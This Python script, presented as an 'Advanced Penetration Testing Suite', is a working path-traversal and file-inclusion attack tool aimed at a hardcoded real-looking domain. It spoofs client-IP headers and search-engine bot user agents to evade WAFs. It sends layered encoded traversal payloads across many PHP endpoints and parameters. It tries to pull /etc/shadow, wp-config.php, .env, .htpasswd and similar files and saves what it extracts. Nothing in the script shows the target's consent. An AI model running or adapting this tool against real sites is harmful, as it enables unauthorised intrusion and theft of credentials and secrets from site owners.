#!/usr/bin/env python3
"""
Advanced Penetration Testing Suite
Sophisticated bypass techniques for protected websites
"""

import requests
import random
import time
import os
import base64
import urllib.parse
import hashlib
import json
import threading
from datetime import datetime
import ssl
import socket
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class AdvancedPenetrationSuite:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.successful_downloads = []
        self.attempt_count = 0
        self.bypass_techniques = []
        
        # Advanced configuration
        self.session.verify = False
        self.session.max_redirects = 10
        
    def generate_advanced_headers(self, technique_level=1):
        """Generate sophisticated headers for different bypass levels"""
        
        # Level 1: Basic bypass headers
        if technique_level == 1:
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ]
            
            bypass_ips = ['127.0.0.1', '192.168.1.1', '10.0.0.1']
            
        # Level 2: Advanced spoofing
        elif technique_level == 2:
            user_agents = [
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                'curl/8.4.0', 'Wget/1.21.4'
            ]
            
            bypass_ips = [
                '127.0.0.1', '::1', 'localhost',
                f'{random.randint(192,192)}.{random.randint(168,168)}.{random.randint(1,1)}.{random.randint(1,254)}'
            ]
            
        # Level 3: Enterprise bypass
        elif technique_level == 3:
            user_agents = [
                'GoogleBot/2.1 (+http://www.google.com/bot.html)',
                'BingBot/2.0 (+http://www.bing.com/bingbot.htm)',
                'YandexBot/3.0 (+http://yandex.com/bots)',
                'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)'
            ]
            
            bypass_ips = ['66.249.66.1', '40.77.167.1', '173.252.74.1']
            
        # Level 4: Advanced evasion
        else:
            user_agents = [
                f'CustomPenTest/{random.randint(1,99)}.{random.randint(0,99)}',
                f'SecurityScanner-{random.randint(1000,9999)}',
                f'InternalTool-{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}'
            ]
            
            bypass_ips = [
                f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
            ]
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'X-Forwarded-For': random.choice(bypass_ips),
            'X-Real-IP': random.choice(bypass_ips),
            'X-Originating-IP': random.choice(bypass_ips),
            'X-Remote-IP': random.choice(bypass_ips),
            'X-Remote-Addr': random.choice(bypass_ips),
            'X-ProxyUser-Ip': random.choice(bypass_ips),
            'X-Cluster-Client-IP': random.choice(bypass_ips),
            'X-Client-IP': random.choice(bypass_ips),
            'CF-Connecting-IP': random.choice(bypass_ips),
            'True-Client-IP': random.choice(bypass_ips),
            'X-Forwarded-Host': random.choice(['localhost', '127.0.0.1', 'internal.local']),
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Scheme': 'https',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        # Advanced technique-specific headers
        if technique_level >= 3:
            headers.update({
                'X-HTTP-Method-Override': 'GET',
                'X-Method-Override': 'GET',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': self.target,
                'Referer': f'{self.target}/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin'
            })
        
        return headers
    
    def generate_advanced_payloads(self, target_file, technique_level=1):
        """Generate sophisticated payloads based on technique level"""
        payloads = []
        
        # Level 1: Basic path traversal
        if technique_level >= 1:
            for depth in range(1, 15):
                payloads.append('../' * depth + target_file)
        
        # Level 2: URL encoding variations
        if technique_level >= 2:
            for depth in range(1, 10):
                payloads.extend([
                    '%2e%2e%2f' * depth + target_file,
                    '%252e%252e%252f' * depth + target_file,
                    '%25252e%25252e%25252f' * depth + target_file
                ])
        
        # Level 3: Advanced encoding
        if technique_level >= 3:
            payloads.extend([
                f'..\\{target_file}',
                f'..%5c{target_file}',
                f'..%255c{target_file}',
                f'....%2f%2f{target_file}',
                f'..%c0%af{target_file}',
                f'..%c1%9c{target_file}',
                f'.%2e/{target_file}',
                f'%2e%2e\\{target_file}',
                f'..%2f%2e%2e%2f{target_file}',
                f'%2e%2e%5c%2e%2e%5c{target_file}'
            ])
        
        # Level 4: Sophisticated filter evasion
        if technique_level >= 4:
            payloads.extend([
                target_file.replace('/', '%2f'),
                target_file.replace('/', '%252f'),
                target_file.replace('/', '\\'),
                target_file.replace('/', '%5c'),
                target_file.replace('.', '%2e'),
                target_file.replace('.', '%252e'),
                base64.b64encode(target_file.encode()).decode(),
                urllib.parse.quote_plus(target_file),
                f'..%00/{target_file}',
                f'..%0d%0a/{target_file}',
                f'..%09/{target_file}',
                f'..%20/{target_file}'
            ])
        
        # Level 5: Advanced obfuscation
        if technique_level >= 5:
            # Unicode normalization attacks
            payloads.extend([
                f'..%u002f{target_file}',
                f'..%u2215{target_file}',
                f'..%u2216{target_file}',
                # Double encoding
                f'%252e%252e%252f' * 3 + urllib.parse.quote(target_file),
                # Mixed case
                target_file.replace('e', '%65').replace('t', '%74').replace('c', '%63')
            ])
        
        return payloads
    
    def advanced_file_inclusion_test(self, target_file, technique_level=1):
        """Advanced file inclusion testing with multiple techniques"""
        
        payloads = self.generate_advanced_payloads(target_file, technique_level)
        
        # Advanced parameter list
        parameters = [
            'page', 'file', 'include', 'path', 'view', 'load', 'read', 'doc', 'document',
            'dir', 'folder', 'src', 'template', 'tmpl', 'layout', 'content', 'data',
            'resource', 'asset', 'component', 'module', 'plugin', 'theme', 'skin'
        ]
        
        # Advanced endpoint discovery
        endpoints = [
            'index.php', 'main.php', 'view.php', 'include.php', 'file.php', 'admin.php',
            'load.php', 'read.php', 'get.php', 'fetch.php', 'download.php', 'export.php',
            'show.php', 'display.php', 'render.php', 'template.php', 'content.php'
        ]
        
        for endpoint in endpoints:
            for param in parameters:
                for payload in payloads:
                    self.attempt_count += 1
                    
                    headers = self.generate_advanced_headers(technique_level)
                    url = f"{self.target}/{endpoint}"
                    
                    try:
                        # Advanced request with multiple methods
                        for method in ['GET', 'POST']:
                            if method == 'GET':
                                response = self.session.get(
                                    url,
                                    params={param: payload},
                                    headers=headers,
                                    timeout=10,
                                    allow_redirects=True
                                )
                            else:
                                response = self.session.post(
                                    url,
                                    data={param: payload},
                                    headers=headers,
                                    timeout=10,
                                    allow_redirects=True
                                )
                            
                            if self.advanced_success_detection(response, target_file):
                                success_data = {
                                    'file': target_file,
                                    'endpoint': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'method': method,
                                    'technique_level': technique_level,
                                    'attempt': self.attempt_count,
                                    'content': response.text,
                                    'headers': dict(response.headers),
                                    'status_code': response.status_code
                                }
                                
                                self.successful_downloads.append(success_data)
                                return True
                                
                    except Exception as e:
                        continue
                    
                    # Rate limiting
                    time.sleep(0.01)
        
        return False
    
    def advanced_success_detection(self, response, target_file):
        """Advanced success detection with multiple indicators"""
        
        if response.status_code not in [200, 201, 202, 301, 302]:
            return False
        
        content = response.text.lower()
        
        # Check if blocked by WAF
        waf_indicators = [
            'cloudflare', 'blocked', 'forbidden', 'ray id', 'attention required',
            'access denied', 'security', 'firewall', 'protection', 'suspicious'
        ]
        
        if any(indicator in content for indicator in waf_indicators):
            return False
        
        # Advanced file-specific detection
        file_signatures = {
            'etc/passwd': {
                'strong': ['root:x:0:0:', 'daemon:x:1:1:', 'bin:x:2:2:'],
                'medium': ['root:', 'bin:', 'daemon:', 'sys:', 'nobody:'],
                'weak': ['/bin/bash', '/bin/sh', '/sbin/nologin']
            },
            'etc/shadow': {
                'strong': ['root:$', 'daemon:*:', 'bin:*:'],
                'medium': ['root:', '$6$', '$5$', '$1$'],
                'weak': [':', '*', '!']
            },
            'etc/hosts': {
                'strong': ['127.0.0.1 localhost', '::1 localhost'],
                'medium': ['localhost', '127.0.0.1'],
                'weak': ['broadcasthost', 'ip6-']
            },
            'wp-config.php': {
                'strong': ["define('DB_NAME'", "define('DB_USER'", "define('DB_PASSWORD'"],
                'medium': ['db_name', 'db_user', 'db_password', 'wp_'],
                'weak': ['mysql', 'database', 'wordpress']
            },
            'config.php': {
                'strong': ['<?php', '$config[', '$db_'],
                'medium': ['database', 'password', 'host', 'user'],
                'weak': ['config', 'settings']
            },
            '.env': {
                'strong': ['APP_KEY=', 'DB_PASSWORD=', 'DB_USERNAME='],
                'medium': ['app_key', 'db_', 'mail_', 'redis_'],
                'weak': ['=', 'secret', 'key']
            },
            '.htaccess': {
                'strong': ['RewriteEngine On', 'RewriteRule', 'DirectoryIndex'],
                'medium': ['rewriteengine', 'rewriterule', 'deny from'],
                'weak': ['options', 'allow', 'order']
            }
        }
        
        # Check for file signatures
        for file_pattern, signatures in file_signatures.items():
            if file_pattern in target_file.lower():
                # Strong indicators (high confidence)
                if any(sig in content for sig in signatures['strong']):
                    return True
                # Medium indicators (medium confidence)
                elif any(sig in content for sig in signatures['medium']):
                    # Additional validation for medium confidence
                    if len(response.text) > 100 and response.status_code == 200:
                        return True
                # Weak indicators (low confidence, need multiple)
                elif sum(1 for sig in signatures['weak'] if sig in content) >= 2:
                    if len(response.text) > 200 and response.status_code == 200:
                        return True
        
        # Generic success indicators
        if (len(response.text) > 500 and 
            response.status_code == 200 and
            not any(html_tag in content for html_tag in ['<html>', '<body>', '<!doctype', '<title>', '<head>']) and
            content.count('\n') > 5):
            return True
        
        return False
    
    def save_successful_download(self, success_data):
        """Save successful download with detailed metadata"""
        os.makedirs("advanced_downloads", exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"advanced_downloads/{success_data['file'].replace('/', '_')}_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("# ADVANCED PENETRATION TEST SUCCESS!\n")
            f.write(f"# Target File: {success_data['file']}\n")
            f.write(f"# Endpoint: {success_data['endpoint']}\n")
            f.write(f"# Parameter: {success_data['parameter']}\n")
            f.write(f"# Payload: {success_data['payload']}\n")
            f.write(f"# Method: {success_data['method']}\n")
            f.write(f"# Technique Level: {success_data['technique_level']}\n")
            f.write(f"# Attempt Number: {success_data['attempt']}\n")
            f.write(f"# Status Code: {success_data['status_code']}\n")
            f.write(f"# Timestamp: {datetime.now()}\n")
            f.write(f"# Response Headers: {json.dumps(success_data['headers'], indent=2)}\n")
            f.write("=" * 100 + "\n\n")
            f.write(success_data['content'])
        
        success_data['local_file'] = filename
        
    def display_results(self):
        """Display all successful downloads"""
        if not self.successful_downloads:
            print("❌ No successful downloads found.")
            return
        
        print(f"\n🎉 ADVANCED PENETRATION TEST RESULTS")
        print("=" * 80)
        print(f"✅ Successfully downloaded {len(self.successful_downloads)} files!")
        print(f"📊 Total attempts: {self.attempt_count}")
        print("=" * 80)
        
        for i, download in enumerate(self.successful_downloads, 1):
            print(f"\n📁 FILE #{i}: {download['file']}")
            print(f"🌐 URL: {self.target}/{download['endpoint']}?{download['parameter']}={download['payload']}")
            print(f"⚡ Method: {download['method']}")
            print(f"🔧 Technique Level: {download['technique_level']}")
            print(f"📊 Status: {download['status_code']}")
            print(f"📏 Size: {len(download['content'])} bytes")
            print(f"💾 Saved: {download['local_file']}")
            print("\n📄 CONTENT:")
            print("-" * 70)
            print(download['content'])
            print("-" * 70)
    
    def run_advanced_penetration_test(self):
        """Run comprehensive advanced penetration test"""
        print("🚀 ADVANCED PENETRATION TESTING SUITE")
        print("=" * 80)
        print("🎯 Target:", self.target)
        print("🔧 Using sophisticated bypass techniques")
        print("⚡ Multi-level approach with advanced evasion")
        print("=" * 80)
        
        target_files = [
            'etc/passwd',
            'etc/shadow', 
            'etc/hosts',
            'proc/version',
            'proc/cpuinfo',
            'proc/meminfo',
            'wp-config.php',
            'config.php',
            'database.php',
            '.env',
            '.htaccess',
            '.htpasswd',
            'web.config',
            'composer.json',
            'package.json'
        ]
        
        # Progressive technique levels
        for technique_level in range(1, 6):
            print(f"\n🔧 TECHNIQUE LEVEL {technique_level}")
            print(f"{'='*50}")
            
            for target_file in target_files:
                print(f"\n🔍 Testing: {target_file} (Level {technique_level})")
                
                if self.advanced_file_inclusion_test(target_file, technique_level):
                    print(f"✅ SUCCESS: {target_file}")
                    self.save_successful_download(self.successful_downloads[-1])
                else:
                    print(f"❌ Failed: {target_file}")
                
                # Progress indicator
                if self.attempt_count % 100 == 0:
                    print(f"📊 Progress: {self.attempt_count} attempts completed")
            
            # If we found files, continue to get more
            if self.successful_downloads:
                print(f"\n🎉 Found {len(self.successful_downloads)} files at level {technique_level}!")
        
        # Display final results
        self.display_results()
        
        return len(self.successful_downloads) > 0

def main():
    target_url = "https://pakyok77.link"
    
    print("🚀 Initializing Advanced Penetration Testing Suite...")
    suite = AdvancedPenetrationSuite(target_url)
    
    success = suite.run_advanced_penetration_test()
    
    if success:
        print(f"\n✅ MISSION ACCOMPLISHED!")
        print(f"📁 Successfully extracted {len(suite.successful_downloads)} files")
    else:
        print(f"\n❌ No files could be extracted despite advanced techniques")
        print(f"🛡️ Target appears to be well-protected")

if __name__ == "__main__":
    main()